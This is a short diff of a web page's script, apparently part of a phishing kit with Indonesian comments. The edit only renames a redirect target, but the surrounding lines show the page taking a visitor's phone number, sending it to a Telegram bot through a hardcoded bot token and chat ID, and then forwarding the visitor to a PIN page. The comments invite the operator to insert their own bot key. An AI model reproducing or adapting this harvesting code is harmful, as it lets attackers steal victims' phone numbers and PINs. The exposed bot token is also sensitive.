@@ -83,7 +83,7 @@
     <script>
         function kirimNomorHP() {
             const phoneInput = $('#phoneInput').val();
-            const urlPindah = 'pin.html'; // Ganti dengan nama file dan ekstensi yang sesuai
+            const urlPindah = 'Pin.html'; // Ganti dengan nama file dan ekstensi yang sesuai
             const telegramApiKey = '6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0'; // Ganti dengan API Key bot Telegram Anda
             const chatId = '6824078885'; // Ganti dengan ID obrolan atau pengguna di Telegram
 
@@ -100,7 +100,7 @@
                             // Kirim pesan ke Telegram Bot
                             kirimPesanTelegram(`Nomor HP berhasil diverifikasi: ${phoneInput}`, telegramApiKey, chatId);
 
-                            // Pindah ke halaman pin.html
+                            // Pindah ke halaman Pin.html
                             window.location.href = urlPindah;
                         }
                     },
